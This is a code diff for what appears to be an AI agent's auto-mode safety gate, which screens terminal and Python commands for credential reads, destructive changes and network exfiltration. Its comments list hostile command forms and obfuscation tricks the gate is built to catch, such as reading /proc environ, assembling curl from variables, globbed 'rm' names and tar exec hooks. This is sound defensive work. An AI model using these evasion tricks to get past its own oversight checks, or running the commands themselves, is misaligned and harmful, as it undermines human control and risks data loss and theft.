+                if "=" in t and t.split("=", 1)[1].lower() in _CURL_DESTRUCTIVE_METHODS:
+                    return True
+                method_pending = True
+                continue
+            if t.startswith("-X") and t[2:].lower() in _CURL_DESTRUCTIVE_METHODS:
+                return True
+        if has_wget:
+            # wget --method=DELETE / --method DELETE is the same remote mutation.
+            if method_pending:
+                method_pending = False
+                if t.lower() in _CURL_DESTRUCTIVE_METHODS:
+                    return True
+            if name in _WGET_METHOD_FLAGS:
+                if "=" in t and t.split("=", 1)[1].lower() in _CURL_DESTRUCTIVE_METHODS:
+                    return True
+                method_pending = True
+                continue
+        if has_curl and (
+            name in _CURL_UPLOAD_LONG_FLAGS
+            # a curl short upload flag, attached or not (-d@f, -Ffile=@dump.sql)
+            or (not name.startswith("--") and name.startswith(_CURL_UPLOAD_SHORT_FLAGS))
+        ):
+            return True
+        if has_wget and name in _WGET_UPLOAD_FLAGS:
+            return True
+    return False
+
+
+# `git clean -n` / `--dry-run` only lists what would be removed.
+_GIT_CLEAN_DRY_RUN_FLAGS = frozenset({"-n", "--dry-run"})
+
+
+def _container_subcommand_is_read_only(tokens: list, start: int) -> bool:
+    """Whether a container CLI's first positional is a read subcommand. A bare
+    `docker` or `docker --version` prints help and runs nothing."""
+    for t in tokens[start + 1 :]:
+        if t in _SHELL_SEPARATORS or not set(t) - set(";&|()"):
+            break
+        if t.startswith("-"):
+            continue
+        return t.lower() in _CONTAINER_READ_SUBCOMMANDS
+    return True
+
+
+def _segment_has_command_after(tokens: list, start: int) -> bool:
+    """Whether a command word follows an assignment in the same segment. A bare
+    `export PATH=...` or `FOO=bar` runs nothing: every terminal call gets its own
+    shell process, so an assignment with no command dies with it."""
+    for t in tokens[start + 1 :]:
+        if t in _SHELL_SEPARATORS or not set(t) - set(";&|()"):
+            return False
+        if _ASSIGNMENT_RE.match(t) or t.startswith("-"):
+            continue
+        return True
+    return False
+
+
+def _segment_has_flag(
+    tokens: list,
+    start: int,
+    exact: frozenset,
+    letters: str = "",
+) -> bool:
+    """Whether a flag appears in the same command segment as ``start``, so a
+    later command's options are not read as this command's."""
+    for t in tokens[start + 1 :]:
+        if t in _SHELL_SEPARATORS or not set(t) - set(";&|()"):
+            break
+        if t in exact:
+            return True
+        if letters and t[:1] == "-" and t[:2] != "--" and "=" not in t:
+            if any(ch in letters for ch in t[1:]):
+                return True
+    return False
+
+
+def _segment_is_recursive(tokens: list, start: int) -> bool:
+    """Whether a recursive flag (-R / --recursive / an -rf style cluster) belongs
+    to the command starting at ``start``: scan only up to the next separator, so
+    `grep -R x . && chmod +x f` does not make the chmod look recursive."""
+    for t in tokens[start + 1 :]:
+        if t in _SHELL_SEPARATORS or not set(t) - set(";&|()"):
+            break
+        if t in ("-R", "--recursive"):
+            return True
+        if t[:1] == "-" and t[:2] != "--" and "=" not in t and "R" in t[1:]:
+            return True
+    return False
+
+
+def _inline_python_is_high_risk(code: str) -> bool:
+    """Screen a `python -c` payload with the same analyzer the python tool uses,
+    so an ordinary one-liner runs and a destructive one still asks. Source that
+    does not parse fails closed: shell quoting may have mangled it, leaving
+    nothing to screen."""
+    try:
+        ast.parse(code)
+    except SyntaxError:
+        return True
+    return _python_is_high_risk(code)
+
+
+def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
+    """High-risk terminal command for auto mode: credential/secret access,
+    privilege escalation, destructive/persistence changes, or network
+    exec/exfil. Ordinary dev commands run without a prompt. Fails closed
+    (prompts) on an unparseable command. ``_depth`` bounds the recursion into
+    shell ``-c`` payloads."""
+    if len(command) > _MAX_TERMINAL_SCAN_CHARS:
+        # Far longer than any ordinary command, and screening it is superlinear,
+        # so it asks instead.
+        return True
+    if not command or not command.strip():
+        return False
+    # A credential/secret path read or write, or a sandbox escape (../), asks.
+    if _command_references_sensitive(command):
+        return True
+    # A bare redirection with no command (`> notes.txt`, `: > notes.txt`) truncates
+    # the file to zero bytes, the same loss as the gated `truncate -s 0`. A
+    # redirect after a real command (`python train.py > out.log`) stays out.
+    if _BARE_TRUNCATING_REDIRECT_RE.search(command):
+        return True
+    # A process substitution an interpreter executes runs a script the static scan
+    # cannot read, so fail closed.
+    if _PROC_SUBST_EXEC_RE.search(command):
+        return True
+    # A script piped into a shell (printf '...' | bash) or fed as a herestring
+    # (bash <<< '...') is executed without ever appearing at command position.
+    if _PKG_REMOVE_AT_CMD_RE.search(command):
+        return True
+    if _PIPE_TO_INTERPRETER_RE.search(command.lower()):
+        return True
+    _herestring = _HERESTRING_TO_INTERPRETER_RE.search(command)
+    if _herestring:
+        return True
+    # Newlines separate commands in a shell but read as whitespace to shlex, and
+    # ANSI-C quoting ($'rm') hides the real command name.
+    normalized = (
+        _decode_ansi_c(command, keep_one_word = True)
+        .replace("\r\n", ";")
+        .replace("\n", ";")
+        .replace("\r", ";")
+    )
+    # A verb hidden behind an assignment (c=rm; $c x) or a default parameter
+    # (${c:-rm}) is expanded so the resolved token is scanned too.
+    expanded = _expand_shell_assignments(_expand_param_defaults(normalized))
+    # Run the network exfil check over the expanded form too, so a curl/wget
+    # name assembled from variables (c=cu d=rl; $c$d -F ...) is still seen.
+    if _command_is_network_exec_or_exfil(command) or _command_is_network_exec_or_exfil(expanded):
+        return True
+    # A command substitution at command position generates the command Bash runs.
+    if _COMMAND_SUBST_AT_CMD_RE.search(command):
+        return True
+    # A variable executed at command position hides the name that actually runs. A
+    # plain assignment is resolved by the expansion above, so reaching here means
+    # the binding came from somewhere this scan cannot follow (a command
+    # substitution, or `printf -v c rm`). No name left to screen: fail closed.
+    if _HAS_COMMAND_SUBST_RE.search(command) and _VAR_EXECUTED_AS_COMMAND_RE.search(command):
+        return True
+    if _BARE_VAR_AS_COMMAND_RE.search(expanded):
+        return True
+    # An array run as a command (x=(git clean -fd); bash -c "${x[*]}") carries no
+    # command substitution, and assignment expansion does not resolve arrays, so
+    # the check above misses it. A benign array print is untouched.
+    if _ARRAY_EXPANSION_RE.search(command) and _VAR_EXECUTED_AS_COMMAND_RE.search(command):
+        return True
+    for text in {normalized, expanded}:
+        try:
+            lexer = shlex.shlex(text, posix = True, punctuation_chars = ";&|()")
+            lexer.whitespace_split = True
+            tokens = list(lexer)
+        except ValueError:
+            return True
+        recursive = any(
+            t in ("-R", "--recursive")
+            or (t[:1] == "-" and t[:2] != "--" and "=" not in t and "R" in t[1:])
+            for t in tokens
+        )
+        find_like = any(
+            os.path.basename(t.strip(";&|()`{}")).lower() in ("find", "fd") for t in tokens
+        )
+        if find_like and any(t.split("=", 1)[0] in _HIGH_RISK_FIND_FLAGS for t in tokens):
+            return True
+        # GNU tar runs --checkpoint-action=exec=CMD at each checkpoint, hiding a
+        # command (including hard-blocked ones) inside an argument.
+        if any(
+            os.path.basename(t.strip(";&|()`{}")).lower() in _ARG_EXEC_FLAG_OWNERS for t in tokens
+        ) and any(t.split("=", 1)[0] in _HIGH_RISK_ARG_EXEC_FLAGS for t in tokens):
+            return True
+        # An interpreter serving on the network exposes the session workdir; the
+        # sandbox keeps no network namespace.
+        if _LISTENER_PY_MODULE_RE.search(text) or _LISTENER_BIN_AT_CMD_RE.search(text):
+            return True
+        expect_command = True  # at the start of a command (after a separator)
+        prefix_pending = False  # inside a wrapper (env/timeout/...) still seeking the command
+        scan_forward = False  # a forwarding command (find/xargs/...) precedes another command
+        current_command = ""  # the resolved command whose flags / git subcommand we judge
+        git_subcommand = ""  # the first positional after `git`
+        shell_c_pending = False  # a shell `-c` precedes its inline payload
+        wrapper_value_pending = False  # a wrapper option precedes its value
+        exec_flag_pending = False  # inside find/fd, waiting for -exec
+        git_checkout_positionals = 0  # positionals seen after `git checkout`
+        git_worktree_action = ""  # the action after `git worktree`
+        win_operand_pending = False  # operand of a Windows `if exist`/`if defined`
+        inline_python_pending = False  # next token is a `python -c` payload
+        py_module_pending = False  # next token is the module after `python -m`
+        git_submodule_action = ""  # the action after `git submodule`
+        awk_program_pending = False  # next positional is an awk program
+        git_config_alias_pending = False  # `git config alias.x` precedes its body
+        git_glob_pending = False  # a git global option (-C repo) precedes its value
+        chdir_pending = False  # a cd/pushd precedes its target directory
+        for _tok_idx, token in enumerate(tokens):
+            if (
+                token in _SHELL_SEPARATORS
+                or (token in _SHELL_KEYWORDS_AS_SEP and expect_command)
+                or not set(token) - set(";&|()")
+            ):
+                expect_command = True
+                prefix_pending = False
+                # A dangling wrapper option (env -u ; rm ...) must not consume
+                # the next segment's command word.
+                wrapper_value_pending = False
+                scan_forward = False
+                current_command = ""
+                git_subcommand = ""
+                git_worktree_action = ""
+                win_operand_pending = False
+                inline_python_pending = False
+                py_module_pending = False
+                git_submodule_action = ""
+                awk_program_pending = False
+                shell_c_pending = False
+                git_glob_pending = False
+                chdir_pending = False
+                continue
+            if py_module_pending:
+                py_module_pending = False
+                if token.strip("\"'").lower() in _LISTENER_PY_MODULE_NAMES:
+                    return True
+            if inline_python_pending:
+                inline_python_pending = False
+                if _depth >= 3 or _inline_python_is_high_risk(token):
+                    return True
+                continue
+            if expect_command and token.lower() in _WIN_CONDITIONAL_KEYWORDS:
+                # `if exist FILE del FILE`: the operand sits where the command
+                # word would be, so the real command is still ahead.
+                win_operand_pending = token.lower() != "not"
+                continue
+            if win_operand_pending:
+                win_operand_pending = False
+                continue
+            if expect_command and _REDIR_PREFIX_RE.match(token):
+                # Bash accepts a redirection before the command word
+                # (`</dev/null rm -rf build`); the command is still to come.
+                continue
+            if token.startswith("-"):
+                flag = token.split("=", 1)[0]
+                # find/fd: the command after -exec/-ok is the one that runs.
+                if exec_flag_pending and flag in _EXEC_FORWARD_FLAGS:
+                    # `fd . --exec=rm` attaches the command to the flag, so the
+                    # value is the command that runs, not an option argument.
+                    if "=" in token and flag in _ATTACHED_EXEC_FLAGS:
+                        attached = token.split("=", 1)[1].strip("\"'")
+                        if attached and (
+                            _depth >= 3 or _terminal_is_high_risk(attached, _depth + 1)
+                        ):
+                            return True
+                    scan_forward = True
+                    expect_command = True
+                    continue
+                if current_command == "setpriv" and flag in _SETPRIV_PRIVILEGE_FLAGS:
+                    # Ahead of the wrapper-value skip below, which would otherwise
+                    # swallow `--reuid 0` before it is judged.
+                    return True
+                # A wrapper option taking a SEPARATE value (env -u NAME): the next
+                # token is that value, not the wrapped command.
+                if (
+                    prefix_pending
+                    and "=" not in token
+                    and flag in _WRAPPER_VALUE_FLAGS_BY_CMD.get(current_command, frozenset())
+                ):
+                    wrapper_value_pending = True
+                    continue
+                # An interpreter running inline code (python -c, node -e) executes
+                # a program the terminal path never screens. Matches the long
+                # --eval/--exec forms and any short cluster carrying -c.
+                _inline_spec = (
+                    _inline_code_flag_spec(current_command)
+                    if _is_inline_code_interpreter(current_command)
+                    else None
+                )
+                _current_is_python_family = current_command.startswith(("python", "pypy"))
+                if _current_is_python_family and flag == "-m":
+                    py_module_pending = True
+                    continue
+                if _inline_spec is not None and (
+                    flag in _inline_spec[0] or _short_flag_arg(token, _inline_spec[1]) is not None
+                ):
+                    # Python payloads go through the python tool's analyzer, so an
+                    # ordinary one-liner runs and a destructive one asks. The other
+                    # runtimes have no analyzer here, so they stay gated.
+                    if _current_is_python_family:
+                        # A bare `-c` yields an EMPTY attached value, not None,
+                        # so the payload is the next token; only a non-empty
+                        # value is the attached form (python -c'print(1)').
+                        _attached = _short_flag_arg(token, _inline_spec[1])
+                        if _attached:
+                            if _depth >= 3 or _inline_python_is_high_risk(_attached):
+                                return True
+                            continue
+                        inline_python_pending = True
+                        continue
+                    return True
+                # node/bun -p / --print evaluate and print arbitrary source, the
+                # same inline-code risk as -e/--eval (attached node -p'...' too).
+                if current_command in _NODE_PRINT_INTERPRETERS and (
+                    flag in _NODE_PRINT_FLAGS or _short_flag_arg(token, "p") is not None
+                ):
+                    return True
+                # PowerShell -Command / -EncodedCommand run an inline program the
+                # terminal path cannot screen; a bare `pwsh script.ps1` still runs.
+                if current_command in _POWERSHELL_INTERPRETERS and flag.lower().startswith(
+                    ("-c", "-e")
+                ):
+                    return True
+                # A shell `-c PAYLOAD` runs its quoted payload; screen it
+                # recursively. Combined clusters (bash -lc) carry -c too.
+                if current_command in _SHELL_C_INTERPRETERS:
+                    payload = _short_flag_arg(token, "c")
+                    if payload is not None:
+                        # A short run of plain letters after `c` (bash -ce) is more
+                        # bash OPTIONS, not an attached payload: the command string
+                        # still comes from the next token.
+                        if payload and payload.isalpha() and len(payload) <= 4:
+                            shell_c_pending = True
+                        elif payload:
+                            if _depth >= 3:
+                                return True
+                            if _terminal_is_high_risk(payload, _depth + 1):
+                                return True
+                        else:
+                            shell_c_pending = True
+                # env -S 'cmd' runs the string as a new command, so screen it;
+                # env -C chdirs (enabling a relative sensitive read), so it asks.
+                if current_command == "env":
+                    if flag in ("-C", "--chdir"):
+                        return True
+                    payload = None
+                    if token.startswith("-S") and token != "-S":
+                        payload = token[2:]  # attached: -S'cmd'
+                    elif flag == "--split-string" and "=" in token:
+                        payload = token.split("=", 1)[1]
+                    elif token == "-S" or flag == "--split-string":
+                        shell_c_pending = True  # payload is the next token
+                    if (
+                        payload is not None
+                        and _depth < 3
+                        and _terminal_is_high_risk(payload, _depth + 1)
+                    ):
+                        return True
+                if current_command == "sysctl" and flag in _SYSCTL_WRITE_FLAGS:
+                    return True
+                if current_command == "fallocate" and (
+                    flag in _FALLOCATE_DESTRUCTIVE_FLAGS
+                    or any(f in _FALLOCATE_DESTRUCTIVE_FLAGS for f in _short_flag_cluster(token))
+                ):
+                    return True
+                if (
+                    current_command == "git"
+                    and git_subcommand == "worktree"
+                    and git_worktree_action == "remove"
+                    and flag in _HIGH_RISK_GIT_WORKTREE_FLAGS
+                ):
+                    return True
+                if current_command == "git":
+                    # reset --hard discards the working tree; push --force
+                    # overwrites a remote ref.
+                    if git_subcommand == "reset" and flag in _HIGH_RISK_GIT_RESET_FLAGS:
+                        return True
+                    if git_subcommand == "push" and (
+                        flag in _HIGH_RISK_GIT_PUSH_FLAGS
+                        or any(f in _HIGH_RISK_GIT_PUSH_FLAGS for f in _short_flag_cluster(token))
+                    ):
+                        return True
+                    # git checkout -f / --force, or an explicit `--` path
+                    # separator (git checkout -- file), discards tracked edits.
+                    if git_subcommand == "checkout" and (
+                        flag in _HIGH_RISK_GIT_CHECKOUT_FLAGS
+                        or any(
+                            f in _HIGH_RISK_GIT_CHECKOUT_FLAGS for f in _short_flag_cluster(token)
+                        )
+                        or token == "--"
+                        or flag == "--pathspec-from-file"
+                    ):
+                        return True
+                    if git_subcommand == "checkout-index" and (
+                        flag in _HIGH_RISK_GIT_CHECKOUT_INDEX_FLAGS
+                        or any(
+                            f in _HIGH_RISK_GIT_CHECKOUT_INDEX_FLAGS
+                            for f in _short_flag_cluster(token)
+                        )
+                    ):
+                        return True
+                    if git_subcommand == "tag" and (
+                        flag in _HIGH_RISK_GIT_TAG_FLAGS
+                        or any(f in _HIGH_RISK_GIT_TAG_FLAGS for f in _short_flag_cluster(token))
+                    ):
+                        return True
+                    if git_subcommand == "switch" and (
+                        flag in _HIGH_RISK_GIT_SWITCH_FLAGS
+                        or any(f in _HIGH_RISK_GIT_SWITCH_FLAGS for f in _short_flag_cluster(token))
+                    ):
+                        return True
+                    # git branch -D / -M drops or overwrites unmerged commits.
+                    if git_subcommand == "branch" and (
+                        flag in _HIGH_RISK_GIT_BRANCH_FLAGS
+                        or any(f in _HIGH_RISK_GIT_BRANCH_FLAGS for f in _short_flag_cluster(token))
+                    ):
+                        return True
+                    # --config-env=<key>=<envvar> reads the value from the
+                    # environment, unresolvable here, so an alias key would store
+                    # unscreened code git runs on the next call.
+                    if flag == "--config-env" and _GIT_CONFIG_ENV_ALIAS_RE.search(token):
+                        return True
+                    # A git global option with a separate value (git -C repo clean)
+                    # precedes its value, not the subcommand.
+                    if not git_subcommand and "=" not in token and flag in _GIT_GLOBAL_VALUE_FLAGS:
+                        git_glob_pending = True
+                continue
+            if _ASSIGNMENT_RE.match(token):
+                _assign_name, _, _assign_value = token.partition("=")
+                # `alias zap='rm -rf'` stores a command bash runs when the alias
+                # is invoked, the same shape as a git alias body.
+                if current_command == "alias" and _assign_value:
+                    if _depth >= 3 or _terminal_is_high_risk(_assign_value, _depth + 1):
+                        return True
+                # PATH/LD_PRELOAD-style assignments hijack command lookup, but only
+                # for the command they prefix: a bare `export PATH=...` runs
+                # nothing, and the shell it was set in exits immediately.
+                if _env_assignment_is_unsafe(
+                    _assign_name, _assign_value
+                ) and _segment_has_command_after(tokens, _tok_idx):
+                    return True
+                continue
+            raw = token.strip(";&|()`{}")
+            if not raw:
+                continue
+            # cmd.exe /c (or /k) runs the following token as a nested command. /c is
+            # not a `-`-flag, so it is handled here in argument position after cmd.
+            if current_command in _CMD_SHELLS and raw.lower() in ("/c", "/k"):
+                shell_c_pending = True
+                continue
+            # The payload of a shell `-c`, screened recursively (bounded depth).
+            if shell_c_pending:
+                shell_c_pending = False
+                # An unquoted payload (cmd /c git clean -fd) spans the remaining
+                # tokens, so screen the whole remainder.
+                payload = " ".join(tokens[_tok_idx:])
+                if _depth >= 3:
+                    # Too deeply nested to screen: fail closed.
+                    return True
+                if _terminal_is_high_risk(payload, _depth + 1):
+                    return True
+                if payload != raw and _terminal_is_high_risk(raw, _depth + 1):
+                    return True
+                expect_command = False
+                continue
+            # The value of a git global option (git -C repo clean): not the subcommand.
+            if git_glob_pending:
+                git_glob_pending = False
+                # `git -c alias.x=BODY` defines an alias git later executes, so the
+                # payload is real code hiding in an option value: screen it.
+                m = _GIT_ALIAS_ASSIGN_RE.match(raw)
+                if m and _depth < 3:
+                    alias_body = m.group(1)
+                    # A `!` alias runs through a shell; a plain one is a git
+                    # subcommand, so screen it as `git <body>` to reach the git
+                    # gates (alias.n='clean -fd' really runs `git clean -fd`).
+                    nested = alias_body[1:] if alias_body.startswith("!") else "git " + alias_body
+                    if _terminal_is_high_risk(nested, _depth + 1):
+                        return True
+                continue
+            # The value of a wrapper option (env -u FOO, stdbuf -o L): not the
+            # command, so skip it and keep looking for the wrapped command.
+            if wrapper_value_pending:
+                wrapper_value_pending = False
+                continue
+            # A wrapper's bare duration argument (timeout 5 rm) is not the command.
+            if prefix_pending and _WRAPPER_DURATION_RE.fullmatch(raw):
+                continue
+            base = os.path.basename(raw).lower()
+            stem, ext = os.path.splitext(base)
+            if ext in {".exe", ".com", ".bat", ".cmd"}:
+                base = stem
+            if (expect_command or prefix_pending) and (
+                base in _AUTO_SAFE_WRAPPERS
+                or base in _MULTICALL_BINARIES
+                or base in _PRIVILEGE_EXEC_WRAPPERS
+            ):
+                # A wrapper (env/timeout) or a multicall binary (busybox rm)
+                # precedes the real command; keep seeking it, but track it so its
+                # own flags (env -S / -C) are judged in the meantime.
+                prefix_pending = True
+                expect_command = False
+                current_command = base
+                continue
+            if expect_command or prefix_pending or scan_forward:
+                if base in _HIGH_RISK_COMMANDS or base.startswith("mkfs"):
+                    # A container CLI reading its own state (docker ps, docker
+                    # logs) inspects; anything else starts or enters a container.
+                    if not (
+                        base in _CONTAINER_CLIS
+                        and _container_subcommand_is_read_only(tokens, _tok_idx)
+                    ):
+                        return True
+                # Bash expands a command-position glob after this scan, so the name
+                # here is not the one that runs (`/bin/r[m] -rf x`): ask.
+                if _is_unresolved_command_glob(base):
+                    return True
+                # A server binary resolved here covers the wrapped and absolute
+                # forms (env uvicorn app:api, timeout 60 gunicorn, /usr/bin/uvicorn).
+                if base in _LISTENER_BINARIES:
+                    return True
+                if base in _HIGH_RISK_RECURSIVE_COMMANDS and _segment_is_recursive(
+                    tokens, _tok_idx
+                ):
+                    return True
+                if base in _HIGH_RISK_FORWARDING_COMMANDS:
+                    # find/fd only run a child at -exec/-ok; forwarding from the
+                    # command itself would make `find . -name rm` prompt.
+                    if base in _EXEC_FLAG_FORWARDING_COMMANDS:
+                        scan_forward = False
+                        exec_flag_pending = True
+                    else:
+                        scan_forward = True
+                elif base == "git":
+                    # Only git needs the forwarding scan to stop: its risk lives in
+                    # the SUBCOMMAND (git clean), so following tokens are git's own
+                    # arguments. Others keep scanning, since find's predicates sit
+                    # between `find` and `-exec rm`.
+                    scan_forward = False
+                # Remember the resolved command so its own flags (python -c), git
+                # subcommand or chdir target can be judged as they follow.
+                current_command = base
+                if base in _CHDIR_COMMANDS:
+                    chdir_pending = True
+                if base in _AWK_COMMANDS:
+                    awk_program_pending = True
+            elif current_command == "git" and not git_subcommand:
+                # The first positional after `git` is its subcommand.
+                git_subcommand = base
+                if base == "clean" and _segment_has_flag(
+                    tokens, _tok_idx, _GIT_CLEAN_DRY_RUN_FLAGS, "n"
+                ):
+                    # A dry run lists what would go and removes nothing.
+                    expect_command = False
+                    prefix_pending = False
+                    continue
+                if base in _HIGH_RISK_GIT_SUBCOMMANDS:
+                    return True
+            elif awk_program_pending:
+                awk_program_pending = False
+                if _AWK_SHELL_ESCAPE_RE.search(raw):
+                    return True
+            elif (
+                current_command == "git"
+                and git_subcommand == "submodule"
+                and git_submodule_action == "foreach"
+            ):
+                # `git submodule foreach '<cmd>'` runs the argument in every
+                # submodule, so it is a command in its own right.
+                git_submodule_action = ""
+                if _depth >= 3 or _terminal_is_high_risk(raw, _depth + 1):
+                    return True
+            elif (
+                current_command == "git"
+                and git_subcommand == "submodule"
+                and not git_submodule_action
+            ):
+                git_submodule_action = base
+            elif current_command == "getent" and base in _GETENT_CREDENTIAL_DATABASES:
+                # The database name is the whole request; no path is mentioned.
+                return True
+            elif current_command == "openssl" and base in _OPENSSL_NETWORK_SUBCOMMANDS:
+                # openssl s_client/s_server open a TLS socket. The regex above is
+                # anchored at command position, so it misses the wrapped forms.
+                return True
+            elif current_command == "sysctl" and "=" in raw:
+                # `sysctl net.ipv4.ip_forward=1` writes without needing -w.
+                return True
+            elif (
+                current_command == "git"
+                and git_subcommand == "worktree"
+                and not git_worktree_action
+            ):
+                git_worktree_action = base
+            elif current_command in _EVAL_SUBCOMMAND_INTERPRETERS and base == "eval":
+                # `deno eval "..."` / `bun eval "..."` run inline code as a
+                # subcommand rather than a flag, the same risk as -e.
+                return True
+            elif current_command == "git" and git_subcommand == "checkout" and base == ".":
+                # `git checkout .` discards every tracked working-tree change.
+                return True
+            elif current_command == "git" and git_subcommand == "checkout":
+                # A SECOND positional means the first was a commit-ish and this is
+                # a pathspec (git checkout HEAD file), which overwrites the file. A
+                # single one is ambiguous with a branch name and is left alone.
+                git_checkout_positionals += 1
+                if git_checkout_positionals >= 2:
+                    return True
+            elif (
+                current_command == "git" and git_subcommand == "config" and git_config_alias_pending
+            ):
+                git_config_alias_pending = False
+                # The stored alias body is code git runs on the next invocation.
+                nested = raw[1:] if raw.startswith("!") else "git " + raw
+                if _depth >= 3 or _terminal_is_high_risk(nested, _depth + 1):
+                    return True
+            elif (
+                current_command == "git"
+                and git_subcommand == "config"
+                and raw.lower().startswith("alias.")
+            ):
+                git_config_alias_pending = True
+            elif (
+                current_command == "git"
+                and git_subcommand == "stash"
+                and base in _HIGH_RISK_GIT_STASH_ACTIONS
+            ):
+                # `git stash clear` / `drop` destroys stashed work unrecoverably.
+                return True
+            elif current_command == "git" and git_subcommand == "push" and raw[:1] in ("+", ":"):
+                # A refspec forcing (+src:dst) or deleting (:dst) a remote ref is
+                # the punctuation form of --force / --delete.
+                if len(raw) > 1:
+                    return True
+            elif chdir_pending:
+                # A chdir into a sensitive directory sets up a relative read that no
+                # single token spells out (cd /proc/$PPID; cat environ).
+                chdir_pending = False
+                if any(
+                    _SENSITIVE_CHDIR_RE.search(cand)
+                    for cand in (raw, _expand_param_defaults(raw), _expand_shell_assignments(raw))
+                ):
+                    return True
+            expect_command = False
+            prefix_pending = False
+    return False
+
+
+def _python_is_high_risk(code: str) -> bool:
+    """High-risk python for auto mode: code the sandbox static analysis would
+    refuse anyway (shell escape, network egress, a sensitive read), that
+    reads/writes a credential path, or that runs dynamically built code past
+    those static checks. Ordinary in-workdir file writes and computation run
+    without a prompt."""
+    if not code or not code.strip():
+        return False
+    # _check_code_safety objecting means execution would be refused outright, so a
+    # confirmation first beats a silent refusal.
+    if _check_code_safety(code) is not None:
+        return True
+    try:
+        tree = ast.parse(code)
+    except SyntaxError:
+        # Unparsable code never runs, but scan the raw text anyway.
+        return _references_sensitive_path(code)
+    # A credential basename only names a file when it appears in a string, so match
+    # it there rather than across the source: `credentials = {}` and
+    # `def load_credentials()` do no I/O and must not prompt.
+    for _node in ast.walk(tree):
+        if (
+            isinstance(_node, ast.Constant)
+            and isinstance(_node.value, str)
+            and _references_sensitive_path(_node.value)
+        ):
+            return True
+    # A destructive filesystem call (shutil.rmtree, Path.unlink) asks, for parity
+    # with the terminal `rm` gate. Collect bare import aliases first.
+    destructive_fs_aliases: "set[str]" = set()
+    # Modules whose handles end processes; tracked so an unrelated .kill() on a
+    # user-defined object is not mistaken for one.
+    psutil_names: "set[str]" = set()
+    for _node in ast.walk(tree):
+        if isinstance(_node, ast.Import):
+            for _a in _node.names:
+                if _a.name.split(".")[0] in _PY_PROCESS_MODULES:
+                    psutil_names.add("psutil")
+        elif (
+            isinstance(_node, ast.ImportFrom)
+            and (_node.module or "").split(".")[0] in _PY_PROCESS_MODULES
+        ):
+            psutil_names.add("psutil")
+    # `import os as filesystem` rebinds the module, so os.remove reached through
+    # the alias (filesystem.remove) must resolve too; posix is os's low-level twin.
+    os_module_aliases: "set[str]" = {"os", "posix", "nt"}
+
+    def _is_os_module_ref(value) -> bool:
+        # A Name bound to os/posix/nt, a walrus binding one, or a literal
+        # __import__("os") call used directly. builtins.__import__ is the same
+        # callable reached through the module, so both spellings resolve.
+        if isinstance(value, ast.Name):
+            return value.id in os_module_aliases
+        if isinstance(value, ast.NamedExpr):
+            return _is_os_module_ref(value.value)
+        if not isinstance(value, ast.Call):
+            return False
+        func = value.func
+        is_import = (isinstance(func, ast.Name) and func.id == "__import__") or (
+            isinstance(func, ast.Attribute) and func.attr == "__import__"
+        )
+        return (
+            is_import
+            and bool(value.args)
+            and isinstance(value.args[0], ast.Constant)
+            and value.args[0].value in ("os", "posix", "nt")
+        )
+
+    for node in ast.walk(tree):
+        if isinstance(node, ast.ImportFrom) and node.module in _PY_DESTRUCTIVE_FS_MODULES:
+            for alias in node.names:
+                if alias.name in _PY_DESTRUCTIVE_FS_IMPORT_NAMES:
+                    destructive_fs_aliases.add(alias.asname or alias.name)
+        elif isinstance(node, ast.Import):
+            for alias in node.names:
+                if alias.name in ("os", "posix", "nt") and alias.asname:
+                    os_module_aliases.add(alias.asname)
+        elif isinstance(node, ast.Assign) and _is_os_module_ref(node.value):
+            # m = __import__("os") binds the module under a new name.
+            for tgt in node.targets:
+                if isinstance(tgt, ast.Name):
+                    os_module_aliases.add(tgt.id)
+        elif isinstance(node, ast.NamedExpr) and _is_os_module_ref(node.value):
+            # (fs := os).remove(...) binds it in an expression instead.
+            if isinstance(node.target, ast.Name):
+                os_module_aliases.add(node.target.id)
+
+    def _is_fs_module_ref(value) -> bool:
+        # os/posix/nt (including aliases), or a literal shutil/pathlib name.
+        if _is_os_module_ref(value):
+            return True
+        return isinstance(value, ast.Name) and value.id in _PY_DESTRUCTIVE_FS_MODULES
+
+    def _is_process_kill(node) -> bool:
+        # psutil.Process(pid).kill() / .terminate(), including a handle bound to
+        # a name first. Keyed on the psutil import so an unrelated .kill() on a
+        # user object does not prompt.
+        if "psutil" not in psutil_names:
+            return False
+        return isinstance(node, ast.Attribute) and node.attr in _PY_PROCESS_KILL_ATTRS
+
+    def _is_destructive_attr(attr: str, value) -> bool:
+        # A destructive-name attribute (unlink/rmtree/...) on any receiver, or
+        # `remove` specifically on the os module (or an alias of it).
+        if attr in _PY_DESTRUCTIVE_FS_ATTRS:
+            return True
+        return attr in _PY_DESTRUCTIVE_FS_OS_ATTRS and _is_os_module_ref(value)
+
+    def _module_dict_target(value):
+        # The module namespace as a dict: vars(os) or os.__dict__.
+        if isinstance(value, ast.Attribute) and value.attr == "__dict__":
+            return value.value
+        if (
+            isinstance(value, ast.Call)
+            and isinstance(value.func, ast.Name)
+            and value.func.id == "vars"
+            and len(value.args) == 1
+        ):
+            return value.args[0]
+        return None
+
+    def _is_module_dict_lookup(node) -> bool:
+        # vars(os)["remove"] / os.__dict__["unlink"] is getattr spelled through
+        # the namespace dict, so screen the key the same way. Anchored to a
+        # filesystem module, leaving an ordinary d["remove"] alone.
+        if not isinstance(node, ast.Subscript):
+            return False
+        module = _module_dict_target(node.value)
+        if module is None:
+            return False
+        attr = _folded_str_literal(node.slice)
+        if attr is None:
+            return _is_fs_module_ref(module)
+        return _is_destructive_attr(attr, module)
+
+    # `rm = getattr(os, "remove")` stores the lookup and calls it later, so the
+    # direct getattr(...)(...) shape never sees it. Bind the name here instead.
+    for node in ast.walk(tree):
+        if not (
+            isinstance(node, ast.Assign)
+            and isinstance(node.value, ast.Call)
+            and isinstance(node.value.func, ast.Name)
+            and node.value.func.id == "getattr"
+            and len(node.value.args) >= 2
+        ):
+            continue
+        _attr = _folded_str_literal(node.value.args[1])
+        _hit = (
+            _is_fs_module_ref(node.value.args[0])
+            if _attr is None
+            else _is_destructive_attr(_attr, node.value.args[0])
+        )
+        if _hit:
+            for tgt in node.targets:
+                if isinstance(tgt, ast.Name):
+                    destructive_fs_aliases.add(tgt.id)
+
+    # `f = open(path, "r+")` then `f.truncate(0)` zeroes the file. Gated via the
+    # handle name, not the bare `.truncate` attribute: pandas DataFrame.truncate()
+    # is common here and non-destructive.
+    file_handles: "set[str]" = set()
+    for node in ast.walk(tree):
+        if (
+            isinstance(node, ast.Assign)
+            and isinstance(node.value, ast.Call)
+            and isinstance(node.value.func, ast.Name)
+            and node.value.func.id == "open"
+        ):
+            for tgt in node.targets:
+                if isinstance(tgt, ast.Name):
+                    file_handles.add(tgt.id)
